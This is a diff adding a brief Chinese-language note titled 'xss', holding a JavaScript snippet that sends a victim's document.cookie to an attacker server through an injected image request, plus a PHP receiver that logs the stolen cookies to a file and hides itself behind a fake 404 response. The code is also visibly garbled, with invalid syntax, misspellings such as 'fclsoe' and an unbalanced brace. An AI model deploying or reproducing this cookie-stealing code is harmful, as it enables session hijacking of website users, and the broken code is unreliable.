@@ -1,0 +1,16 @@
+xss
+
+发送cookie的js代码
+var img = document.createElement("img");img src="http:\\server?v="+document.cookie;document.getElementsByTagName("body")[0].appendChild(img);
+
+接收端代码
+
+<?php
+if(isset($_GET['v']))
+		$f= fopen('./APOINYTG>TXT','a');
+		fwrite($f,"\r\n{&_GET['v']}\r\n");
+		fclsoe($f);
+}
+header('HTTP/1.1 404 Not Found');
+header('status: 404 Not Found');
+?>
